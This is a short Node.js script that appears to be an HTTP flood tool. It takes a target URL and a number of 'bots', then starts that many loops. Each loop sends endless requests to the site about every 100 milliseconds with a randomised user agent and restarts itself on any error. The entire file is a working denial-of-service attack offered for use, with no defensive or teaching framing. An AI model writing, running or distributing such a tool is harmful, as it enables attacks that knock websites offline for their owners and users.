//Dependencies
const Random_UserAgent = require("random-useragent")
const Request = require("request")
const Chalk = require("chalk")
const Delay = require("delay")

//Variables
const Self_Args = process.argv.slice(2)

//Functions
async function Initiate_A_Requester(){
    const UserAgent = Random_UserAgent.getRandom()

    await Delay(100)

    Request(Self_Args[0], {
        headers: {
            "UserAgent": UserAgent
        }
    }, function(err, res, body){
        if(err){
            Initiate_A_Requester()
            return
        }

        console.log(`${Chalk.grey("[") + Chalk.yellowBright("WARNING") + Chalk.grey("]")} A request has been made on the website.`)

        Initiate_A_Requester()
        return
    })
}

//Main
if(Self_Args.length == 0){
    console.log(`node index.js <url> <bots>
Example: node index.js https://example.com 10`)
    process.exit()
}

if(Self_Args[0] == ""){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid url.`)
    process.exit()
}

if(Self_Args[0].indexOf("http") == -1){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid url.`)
    process.exit()
}

if(Self_Args[1] == ""){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid bots.`)
    process.exit()
}

if(isNaN(Self_Args[1])){
    console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Bots is not an Int.`)
    process.exit()
}

Request(Self_Args[0], function(err, res, body){
    if(err){
        console.log(`${Chalk.grey("[") + Chalk.redBright("ERROR") + Chalk.grey("]")} Invalid url.`)
        process.exit()
    }

    console.log(`${Chalk.grey("[") + Chalk.blueBright("INFO") + Chalk.grey("]")} Requesting has started.`)
    for( i = 0; i <= Self_Args[1]; i++ ){
        Initiate_A_Requester()
    }
})
